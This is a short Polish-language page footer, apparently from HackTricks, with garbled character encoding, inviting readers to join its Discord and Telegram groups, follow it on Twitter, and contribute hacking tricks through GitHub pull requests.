* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
